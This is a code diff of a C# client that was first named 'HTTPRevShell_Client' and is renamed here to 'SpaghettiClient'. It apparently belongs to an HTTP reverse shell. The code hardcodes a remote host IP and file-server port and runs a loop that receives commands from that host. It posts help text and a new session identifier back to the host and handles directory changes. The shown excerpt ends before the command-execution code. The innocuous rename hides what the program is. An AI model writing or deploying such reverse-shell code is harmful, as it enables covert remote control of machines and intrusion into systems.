@@ -1,22 +1,19 @@
 ﻿using System;
 using System.IO;
-using System.Net;
-using System.Text;
-using System.Text.RegularExpressions;
-using System.Diagnostics;
-using System.Management.Automation;
-using System.Collections.ObjectModel;
-using System.Management.Automation.Runspaces;
 
-namespace HTTPRevShell_Client
+namespace SpaghettiClient
 {
     class Program
     {
         static void Main(string[] args)
         {
             string host = "10.200.32.131"; // change the host ip
+            int fs_port = 8088; // change the fileserver port
+
             string url = String.Format("http://{0}/", host);
             string location = Directory.GetCurrentDirectory();
+            string sessionid = Guid.NewGuid().ToString();
+
             Commands commands = new Commands();
 
             while(true)
@@ -26,9 +23,13 @@ namespace HTTPRevShell_Client
                 {
                     break;
                 }
-                if (cmd == "help")
+                else if (cmd == "help")
                 {
                     Utilities.Post(url, Utilities.PrintHelp());
+                }
+                else if (cmd == "session")
+                {
+                    Utilities.Post(url, sessionid);
                 }
                 else if (cmd.StartsWith("cd ")) 
                 {
